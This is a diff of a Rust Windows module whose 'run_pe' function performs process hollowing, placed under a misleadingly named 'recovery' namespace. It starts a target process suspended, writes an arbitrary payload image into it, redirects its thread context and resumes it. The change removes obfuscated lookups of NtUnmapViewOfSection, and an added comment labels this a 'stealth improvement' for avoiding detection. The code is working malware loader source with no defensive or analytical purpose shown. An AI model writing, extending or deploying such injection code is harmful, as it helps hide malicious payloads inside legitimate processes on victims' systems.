@@ -1,6 +1,6 @@
 #![allow(non_snake_case)]
 
-use crate::recovery::helpers::obfuscation::{deobf, deobf_w};
+use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::helpers::pe::{
     IMAGE_DOS_HEADER,
     IMAGE_NT_HEADERS64,
@@ -10,18 +10,14 @@ use crate::recovery::settings::RecoveryControl;
 use std::env;
 use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
-use std::ptr::null_mut;
 use tracing::{debug, error, info};
-use windows::Win32::Foundation::HANDLE;
 use windows::Win32::System::Diagnostics::Debug::{
     CONTEXT,
     CONTEXT_FLAGS,
     GetThreadContext,
-    ReadProcessMemory,
     SetThreadContext,
     WriteProcessMemory,
 };
-use windows::Win32::System::LibraryLoader::GetModuleHandleW;
 use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, VirtualAllocEx};
 use windows::Win32::System::Threading::{
     CREATE_SUSPENDED,
@@ -30,7 +26,7 @@ use windows::Win32::System::Threading::{
     ResumeThread,
     STARTUPINFOW,
 };
-use windows::core::{PCSTR, PCWSTR, PWSTR};
+use windows::core::{PCWSTR, PWSTR};
 
 #[repr(C)]
 pub struct IMAGE_BASE_RELOCATION {
@@ -122,42 +118,12 @@ pub fn run_pe(payload_bytes: &[u8], target_path: &str) -> Result<(), Box<dyn std
         let _pi_guard = ProcessInformationGuard(pi);
 
         let mut context: CONTEXT = std::mem::zeroed();
-        #[cfg(target_arch = "x86_64")]
-        let mut target_image_base: *mut std::ffi::c_void = null_mut();
 
         #[cfg(target_arch = "x86_64")]
         {
             context.ContextFlags = CONTEXT_FLAGS(CONTEXT_AMD64_FULL);
             GetThreadContext(pi.hThread, &mut context)
                 .map_err(|e| format!("failed to get context: {}", e))?;
-
-            let peb_base = context.Rdx;
-            ReadProcessMemory(
-                pi.hProcess,
-                (peb_base + 0x10) as *const _,
-                &mut target_image_base as *mut _ as *mut _,
-                std::mem::size_of::<*mut std::ffi::c_void>(),
-                None,
-            )
-            .map_err(|e| format!("failed to read PEB: {}", e))?;
-
-            let ntdll_name = deobf_w(&[0xD3, 0xC9, 0xD9, 0xD1, 0xD1, 0x93, 0xD9, 0xD1, 0xD1]);
-            let ntdll = GetModuleHandleW(PCWSTR(ntdll_name.as_ptr()))?;
-            let nt_unmap_name_str = deobf(&[
-                0xF3, 0xC9, 0xE8, 0xD3, 0xD0, 0xDC, 0xCD, 0xEB, 0xD4, 0xD8, 0xCA, 0xF2, 0xDB, 0xEE,
-                0xD8, 0xDE, 0xC9, 0xD4, 0xD2, 0xD3,
-            ]);
-            let nt_unmap_name = format!("{}\0", nt_unmap_name_str);
-            if let Some(proc) = windows::Win32::System::LibraryLoader::GetProcAddress(
-                ntdll,
-                PCSTR(nt_unmap_name.as_ptr()),
-            ) {
-                let nt_unmap_view_of_section: unsafe extern "system" fn(
-                    HANDLE,
-                    *mut std::ffi::c_void,
-                ) -> u32 = std::mem::transmute(proc);
-                nt_unmap_view_of_section(pi.hProcess, target_image_base);
-            }
         }
 
         let dos_header = &*(payload_bytes.as_ptr() as *const IMAGE_DOS_HEADER);
@@ -173,23 +139,16 @@ pub fn run_pe(payload_bytes: &[u8], target_path: &str) -> Result<(), Box<dyn std
             return Err("invalid NT headers".into());
         }
 
-        let mut remote_image_base = VirtualAllocEx(
+        // Stealth improvement: Do NOT unmap the original image (NtUnmapViewOfSection).
+        // Instead, allocate a new region and let the relocation logic handle the base change.
+        // We will then update the PEB's ImageBaseAddress to point to our new location.
+        let remote_image_base = VirtualAllocEx(
             pi.hProcess,
-            Some(nt_headers.optional_header.image_base as *const _),
+            None,
             nt_headers.optional_header.size_of_image as usize,
             MEM_COMMIT | MEM_RESERVE,
             windows::Win32::System::Memory::PAGE_READWRITE,
         );
-
-        if remote_image_base.is_null() {
-            remote_image_base = VirtualAllocEx(
-                pi.hProcess,
-                None,
-                nt_headers.optional_header.size_of_image as usize,
-                MEM_COMMIT | MEM_RESERVE,
-                windows::Win32::System::Memory::PAGE_READWRITE,
-            );
-        }
 
         if remote_image_base.is_null() {
             return Err("failed to allocate memory in target process".into());
